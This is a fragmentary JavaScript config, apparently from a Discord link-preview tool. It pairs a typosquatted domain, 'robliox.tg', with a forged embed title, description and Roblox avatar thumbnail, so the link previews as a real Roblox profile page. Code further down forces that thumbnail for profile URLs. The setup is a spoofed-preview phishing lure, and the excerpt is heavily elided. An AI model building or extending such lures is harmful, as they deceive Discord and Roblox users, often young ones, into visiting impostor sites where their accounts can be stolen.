...
const CONFIG = {
    ...
    quick: {
      ...
      content: "https://www.robliox.tg/users/6081066/profile embedTitle: \"Konethorix's Profile\" embedDescription: \"Konethorix is one of the millions creating and exploring the endless possibilities of Roblox. Join Tsundari on Roblox and explore together!｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ ♡ ♡ 21+...\" embedThumbnail: \"https://images-ext-1.discordapp.net/external/egR8q16749GC4dSR2dYPVr1jfnk4LyfBgl0zMj4IEMM/https/tr.rbxcdn.com/30DAY-Avatar-AF8C1D09485419A05356B4F0B8E9D2A7-Png/352/352/Avatar/Png/noFilter?format=webp&width=440&height=440\"",
      embed: {
        title: "",
        description: "",
        url: "",
              ...
              if (!embed?.title) {
                if (hostname.includes('roblox')) {
                  ...
                  if (url.includes('/users/') && url.includes('/profile')) {
                    ...
                    embedData.thumbnail.url = `https://images-ext-1.discordapp.net/external/egR8q16749GC4dSR2dYPVr1jfnk4LyfBgl0zMj4IEMM/https/tr.rbxcdn.com/30DAY-Avatar-AF8C1D09485419A05356B4F0B8E9D2A7-Png/352/352/Avatar/Png/noFilter?format=webp&width=440&height=440`;
